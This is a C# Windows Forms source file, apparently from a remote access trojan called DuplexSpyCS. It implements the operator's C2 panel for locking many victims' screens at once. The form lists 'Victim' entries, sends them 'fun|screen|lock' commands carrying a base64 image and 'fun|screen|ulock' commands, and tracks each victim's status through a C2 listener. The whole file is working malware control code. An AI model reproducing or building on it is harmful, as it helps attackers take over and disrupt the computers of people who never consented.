using OpenCvSharp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Metadata.Edm;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiLockScreen : Form
    {
        public List<Victim> l_victim;

        public frmMultiLockScreen()
        {
            InitializeComponent();
        }

        private ListViewItem lviFindItemWithVictim(Victim v)
        {
            ListViewItem item = null;

            Invoke(new Action(() =>
            {
                foreach (ListViewItem x in listView1.Items)
                {
                    if ((Victim)x.Tag == v)
                    {
                        item = x;
                    }
                }
            }));

            return item;
        }

        private void Received(Listener l, Victim v, string[] cmd)
        {
            if (cmd[0] == "fun")
            {
                if (cmd[1] == "screen")
                {
                    if (cmd[2] == "lock")
                    {
                        int code = int.Parse(cmd[3]);
                        ListViewItem item = lviFindItemWithVictim(v);
                        if (item == null)
                        {
                            MessageBox.Show("lviFindItemWithVictim() return NULL value.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        Invoke(new Action(() =>
                        {
                            item.SubItems[2].Text = code == 0 ? "Unlock" : "OK";
                        }));
                    }
                }
            }
        }

        public void UpdateStatus(Victim v, string status)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = listView1.FindItemWithText(v.ID);
                if (item != null)
                {
                    item.SubItems[2].Text = status;
                }
            }));
        }

        void setup()
        {
            C2.listener.ReceivedDecoded += Received;

            for (int i = 0; i < l_victim.Count; i++)
            {
                ListViewItem item = new ListViewItem(i.ToString());
                item.SubItems.Add(l_victim[i].ID);
                item.SubItems.Add("Unlock");
                item.Tag = l_victim[i];

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{l_victim.Count}]";
        }

        private void frmMultiLockScreen_Load(object sender, EventArgs e)
        {
            setup();
        }

        //SELECT
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Filter = "Image file(*.png;*.jpg)|*.png;*.jpg";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        //LOCK
        private void button2_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find image file: " + szFileName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szImageBase64 = C2.ImageToBase64(szFileName);

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                Victim v = (Victim)item.Tag;
                v.SendCommand("fun|screen|lock|" + szImageBase64);
            }
        }

        //UNLOCK
        private void button3_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find image file: " + szFileName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szImageBase64 = C2.ImageToBase64(szFileName);

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                Victim v = (Victim)item.Tag;
                v.SendCommand("fun|screen|ulock");
            }
        }

        //Check All
        private void button4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }

        private void frmMultiLockScreen_FormClosed(object sender, FormClosedEventArgs e)
        {
            C2.listener.ReceivedDecoded -= Received;
        }
    }
}
